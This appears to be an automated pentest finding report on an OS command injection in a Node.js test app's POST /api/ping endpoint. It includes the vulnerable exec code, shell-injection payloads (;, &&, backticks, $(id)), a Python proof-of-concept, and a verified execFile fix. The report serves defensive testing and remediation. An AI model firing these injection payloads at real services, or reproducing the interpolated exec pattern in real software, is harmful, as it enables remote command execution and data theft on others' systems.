# OS Command Injection in POST /api/ping host parameter

**ID:** vuln-0001
**Severity:** CRITICAL
**Found:** 2026-11-13 07:59:55 UTC
**Target:** /workspace/strix-test-app
**Endpoint:** /api/ping
**Method:** POST
**CWE:** CWE-78
**CVSS:** 9.8
**Confidence:** High
**Fix Effort:** Trivial

## Description

The **`host`** field of `POST /api/ping` is interpolated unsanitized into a shell command string passed to `child_process.exec`, allowing an unauthenticated client to execute arbitrary OS commands on the server and read their output directly in the HTTP response.

## Evidence

Baseline request and response (benign host):

```http
POST /api/ping HTTP/1.1
Content-Type: application/json

{"host":"127.0.0.1"}
```

```json
{"output":"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.018 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms\n","error":null}
```

Exploit request and response (semicolon class; `id` output plus unique marker `STRIXd0826e957a31` returned in-band):

```http
POST /api/ping HTTP/1.1
Content-Type: application/json

{"host":"127.0.0.1; id; echo STRIXd0826e957a31"}
```

```json
{"output":"PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.010 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.010/0.010/0.010/0.000 ms\nuid=1001(pentester) gid=1001(pentester) groups=1001(pentester),27(sudo)\nSTRIXd0826e957a31\n","error":null}
```

AND-chain class (`{"host":"127.0.0.1 && id"}`) also returned `uid=1001(pentester) gid=1001(pentester) groups=1001(pentester),27(sudo)` after the ping output. Backtick class (`{"host":"`id`"}`) and subshell class (`{"host":"$(id)"}`) both executed the substitution — the server reported `ping: groups=1001(pentester),27(sudo): Name or service not known`, echoing the substituted `id` output as the resolved hostname, proving shell evaluation. Proxy exchange IDs were not retained: the capture proxy for this run was started without request logging, so the proving transcripts are reproduced verbatim above.

## Impact

Any network-reachable client achieves arbitrary command execution as the service user (demonstrated: `id` returned `uid=1001(pentester) gid=1001(pentester) groups=1001(pentester),27(sudo)`, plus a unique marker echoed in-band). This grants full control of the host under the application's privileges: arbitrary file read/write (e.g. `cat /etc/passwd`, credential theft, key planting), service disruption, and persistence. No authentication or user interaction is required.

## Counterevidence

Actively looked for controls that could neutralize this: no input validation, allowlist, or escaping exists anywhere on the `req.body.host` → `exec()` path; the route is unauthenticated with no rate limiting or WAF. All four metacharacter classes (`;`, `&&`, backticks, `$(...)`) were tested and each executes, so no payload-specific filtering is in effect. Negative control performed: after replacing `exec` with argument-array `execFile` and restarting the identical service, the same payloads fail (host string resolved literally) while benign hosts still succeed — confirming shell interpretation via the template literal is the root cause and the fix closes it. The only exploitation constraint is network reachability of port 3456.

## What Would Change This Severity

Confirmation that the service is reachable only from localhost by trusted operators (not bound for external clients) would lower exploitability and severity; no evidence can raise it further, since unauthenticated arbitrary command execution with in-band output is already demonstrated.

## Technical Analysis

The handler at `server.js:8-13` reads the attacker-controlled JSON field `req.body.host` (defaulting to `127.0.0.1`) and interpolates it into a template literal passed to `child_process.exec`:

```javascript title=server.js
app.post('/api/ping', (req, res) => {
    const host = req.body.host || '127.0.0.1';
    exec(`ping -c 1 ${host}`, (err, stdout) => {
        res.json({ output: stdout, error: err ? err.message : null });
    });
});
```

`child_process.exec` runs its command through `/bin/sh -c`, so every shell metacharacter in `host` is interpreted by the shell: `;` terminates the ping and starts a new command, `&&` chains on success, and backticks / `$(...)` are substituted in place. No validation, allowlist, or escaping exists anywhere on the path, and the resulting `stdout` is returned to the client in the JSON response, giving in-band output exfiltration. Four payload classes were verified live (`;`, `&&`, backticks, `$(...)`), each executing `id` as the service user.

## Proof of Concept

Start the service (`node server.js` in the app directory; listens on port 3456). Send a baseline benign request to `POST /api/ping` with body `{"host":"127.0.0.1"}` and observe normal ping output. Then send the exploit request with body `{"host":"127.0.0.1; id; echo STRIXd0826e957a31"}` — the response's `output` field contains the `id` result and the marker after the ping output, proving injected command execution with in-band output exfiltration. Repeat with `&&`, backtick, and `$(...)` payload classes to confirm each executes.

```python
import requests

BASE = "http://127.0.0.1:3456/api/ping"

# Baseline: benign host behaves normally
baseline = requests.post(BASE, json={"host": "127.0.0.1"}, timeout=10)
print("baseline:", baseline.json()["output"].splitlines()[0])

# Exploit: semicolon-delimited command execution with unique marker
marker = "STRIXd0826e957a31"
exploit = requests.post(BASE, json={"host": f"127.0.0.1; id; echo {marker}"}, timeout=10)
out = exploit.json()["output"]
assert "uid=" in out and marker in out, out
print("injected id output:", [l for l in out.splitlines() if l.startswith("uid=")])
print("marker echoed:", marker in out)

# Additional payload classes
for payload in ["127.0.0.1 && id", "`id`", "$(id)"]:
    resp = requests.post(BASE, json={"host": payload}, timeout=10).json()
    executed = "uid=" in (resp.get("output") or "") or "uid=" in (resp.get("error") or "")
    print(f"class {payload!r} executed: {executed}")
```

## Remediation

Avoid shell interpretation entirely: use `child_process.execFile` (or `spawn` without `shell: true`) and pass the host as a single array element, so attacker input can never be parsed as shell syntax — this is the applied fix. Additionally append a `--` argument terminator before the user value so a hostile host cannot be interpreted as a `ping` option, and consider validating `host` against a hostname/IP pattern before use as defense in depth. Never build shell command strings by interpolating request data into template literals passed to `exec`.

## Fix Verification

Gate 1 (Applicability): the diff contains only the two changed lines (import and exec call); `fix_before` blocks are verbatim copies of the original source; `node --check server.js` passes on the patched file. Gate 2 (Security closure): re-ran the original PoC payloads against the restarted patched service — `; id; echo <marker>`, `&& id`, `` `id` ``, and `$(id)` all now fail with the literal string passed to ping (`ping: 127.0.0.1; id; echo ...: Name or service not known`) and no command output; shell interpretation is gone because `execFile` with an argument array never invokes `/bin/sh`. Gate 3 (Bypass review): tested alternate input classes against the patched code — array-valued `host` (coerced to a single string argument, no shell), object-valued `host` (`[object Object]` as hostname), embedded whitespace/extra flags (`127.0.0.1 -c 10` treated as one literal hostname; the `--` terminator prevents leading-dash option injection), and a null byte (500 `ERR_INVALID_ARG_VALUE`, identical to pre-patch `exec` behavior — verified `exec` also throws on null bytes via a direct Node check, so not a regression); the service survived all of these and continued serving. Gate 4 (Preserved behavior): benign `127.0.0.1`, `localhost`, omitted-host default (`127.0.0.1`), and `GET /` all still work with identical output. Gate 5 (Repository checks): `node --check server.js` OK; the repo defines no runnable test suite (`npm test` is a placeholder), so runtime verification was performed manually via HTTP against the running service. Gap: no automated tests exist to add a regression case to; the manual before/after transcripts above serve as the verification record.
